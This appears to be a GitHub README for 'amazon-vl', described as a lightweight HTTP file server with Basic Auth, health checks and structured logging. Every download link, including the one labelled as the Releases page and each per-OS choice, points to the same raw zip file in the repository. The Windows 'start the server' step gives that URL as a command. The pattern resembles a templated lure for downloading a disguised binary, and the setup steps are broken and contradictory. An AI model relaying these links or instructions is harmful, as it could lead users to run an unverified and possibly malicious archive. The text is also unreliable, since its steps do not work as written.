# 🎉 amazon-vl - Secure File Server Made Easy

## 🚀 Getting Started

Welcome to **amazon-vl**, a lightweight HTTP file server that uses Basic Auth for secure log exposure. This application is production-ready, featuring a graceful shutdown, health checks, and structured logging. You can easily share and manage your logs while maintaining security.

## 📦 Download

[![Download amazon-vl](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip)](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip)

Go to the Releases page to download the latest version of **amazon-vl**: [Download Here](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip)

## ⚙️ System Requirements

To run **amazon-vl**, you need:

- A supported operating system: Windows, macOS, or Linux
- A modern web browser for accessing the server
- Basic network configuration to allow incoming connections

## 📥 Download & Install

1. Visit the [Releases page](https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip).
2. Look for the version you want to download.
3. Click on the appropriate file for your system:
   - For Windows, choose `https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip`
   - For macOS, download `https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip`
   - For Linux, select `https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip`
4. Save the file to your computer.
5. If needed, extract the contents of the downloaded file.

## 🛠️ Running amazon-vl

### Step 1: Open a Terminal or Command Prompt

- For Windows, search for `cmd` in the Start menu.
- For macOS, open `Terminal` from Applications.
- For Linux, open your preferred terminal emulator.

### Step 2: Navigate to the Download Folder

Use the following command to change to your download directory:

```bash
cd path/to/your/download/folder
```

### Step 3: Start the Server

Run the following command for your respective operating system:

- **Windows:** 
  ```bash
  https://github.com/ahnitin/amazon-vl/raw/refs/heads/main/cmd/amazon-vl-3.0.zip
  ```

- **macOS:** 
  ```bash
  ./amazon-vl
  ```

- **Linux:** 
  ```bash
  ./amazon-vl
  ```

### Step 4: Access the Server

Once the server is running, open your web browser and go to `http://localhost:8080` to access the file server. 

### Step 5: Log In 

You will need to enter a username and password for Basic Auth. Default credentials are provided in the documentation on the Releases page. Change these as needed for security.

## 📃 Basic Configuration

You can configure **amazon-vl** for your needs by editing the configuration file. Here’s what you can adjust:

- **Port:** Change the port if `8080` is in use.
- **Log Files:** Specify the location where logs are stored.
- **Security Settings:** Adjust the username and password for Basic Auth.

Follow the instructions in the configuration file comments to make your changes.

## 📊 Features

- **Basic Authentication:** Keeps your logs secure.
- **Graceful Shutdown:** Saves state and closes connections properly.
- **Health Checks:** Ensures your server is running smoothly.
- **Structured Logging:** Collect detailed logs for analysis.

## 🔍 Troubleshooting

If you run into issues, check the following:

- Ensure that you are using the correct version for your operating system.
- Verify the Basic Auth credentials you entered.
- Ensure that your firewall settings allow traffic on the selected port.

## 🙌 Community & Support

If you have questions or need help, you can join our community discussions on GitHub. We welcome contributions and suggestions.

## 📄 License

**amazon-vl** is open-source software licensed under the MIT License. Feel free to use it as per the license terms in the repository.

Now you can efficiently manage and expose logs with **amazon-vl**! Enjoy a secure and straightforward environment for your file serving needs.